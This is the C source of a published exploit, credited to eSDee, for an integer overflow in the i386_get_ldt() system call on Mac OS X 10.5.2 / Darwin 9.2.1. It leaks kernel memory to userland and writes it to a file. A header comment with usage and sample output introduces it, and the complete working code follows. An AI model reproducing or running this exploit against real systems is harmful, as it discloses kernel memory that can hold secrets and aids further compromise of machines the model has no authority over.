/* 14-05-08 i386_get_ldt() exploit By eSDee (esdee@promisc.org)
**
** Integer overflow in the i386_get_ldt() resulting in kernel memory
** getting copyout()'ed back to userland. Be careful with leaking to many
** pages back to userland; it can result in a kernel panic!
**
** Tested on:
**
** Mac OS 10.5.2 - Darwin 9.2.1
**
** Usage:
**
** [esdee@p4nt0ff3l research]$ ./ldt_kernmem_leak 28 kern.dump
** [!] i386_get_ldt exploit - (esdee@promisc.org)
**  -  Leaking 114688 bytes to "kern.dump" ... 
**  -  Done.
** [esdee@p4nt0ff3l research]$ ls -al kern.dump 
** -rwx------  1 esdee  staff  114688 May 16 22:10 kern.dump
** [esdee@p4nt0ff3l research]$ strings kern.dump
** 
** [...]
**
** _compare_and_swap32
** _compare_and_swap32
** _compare_and_swap32b
** _compare_and_swap32b
** _compare_and_swap64b
** _compare_and_swap64b
** _memset_pattern
** _memset_pattern
** _atomic_enqueue
** _atomic_enqueue
**
** [...]
**
*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <i386/user_ldt.h>
#include <sys/mman.h>
#include <fcntl.h>

#define MAX_PAGES       50
#define NAME            "ldt_kernmem_leak"

void print_usage(const char *prog);
u_int32_t get_desc_pages(size_t page_size, size_t num_pages);
u_int32_t get_page_size(void);

void
print_usage(const char *prog)
{       
        fprintf(stderr, " -  Usage: %s <# pages to leak> <filename>\r\n",
                        prog);

        return;
}

u_int32_t
get_desc_pages(size_t page_size, size_t num_pages)
{
        void *page = NULL;

        if (!page_size || (num_pages < 1)) {
                fprintf(stderr, "get_desc_pages: Invalid page size or invalid num_pages.\r\n");
                exit(EXIT_FAILURE);
        }

        page =  mmap(   NULL,
                        page_size * (num_pages + 1),
                        PROT_READ|PROT_WRITE,
                        MAP_ANON|MAP_PRIVATE|MAP_NOCACHE,
                        -1,
                        0);

        if (page == (void *)-1) {
                perror("mmap");
                exit(EXIT_FAILURE);
        }

        if (    mprotect(       page + (page_size * (num_pages)),
                                page_size,
                                PROT_NONE) < 0) {
                perror("mprotect");
                exit(EXIT_FAILURE);
        }

        return (u_int32_t)(page);
}

u_int32_t
get_page_size(void)
{       
        return 4096;
}

int
main(int argc, char *argv[])
{
        u_int32_t desc          = 0;
        u_int32_t leak_bytes    = 0;
        u_int32_t num_sel       = 0xffffffff;
        u_int32_t num_pages     = 0;
        u_int32_t page_size     = get_page_size();
        u_int32_t start_sel     = 1;

        int fd                  = 0;

        fprintf(stdout, "[!] i386_get_ldt exploit - (esdee@promisc.org)\r\n");

        if (argc < 3) {
                print_usage(argv[0] == NULL ? NAME : argv[0]);
                exit(EXIT_FAILURE);
        }
        
        num_pages = atoi(argv[1]);

        if (!num_pages || num_pages > MAX_PAGES) {
                fprintf(stderr, "%s: Invalid number of pages. \r\n",
                                argv[0] == NULL ? NAME : argv[0]);

                exit(EXIT_FAILURE);
        }

        desc            = get_desc_pages(page_size, num_pages);
        leak_bytes      = page_size * num_pages;

        if ((fd = open(argv[2], O_WRONLY|O_CREAT|O_NOFOLLOW|O_EXCL, 0700)) < 0) {
                perror("open");
                exit(EXIT_FAILURE);
        }

        fprintf(stdout, " -  Leaking %u bytes to \"%s\" ... \r\n",
                        leak_bytes, argv[2]);

        /* Trigger the vulnerability ... */

        i386_get_ldt(start_sel, (union ldt_entry *)desc, num_sel);

        if (write(fd, (char *)desc, leak_bytes) != leak_bytes) {
                perror("write");
                exit(EXIT_FAILURE);
        }

        fprintf(stdout, " -  Done.\r\n");
        
        close(fd);

        return 0;
}
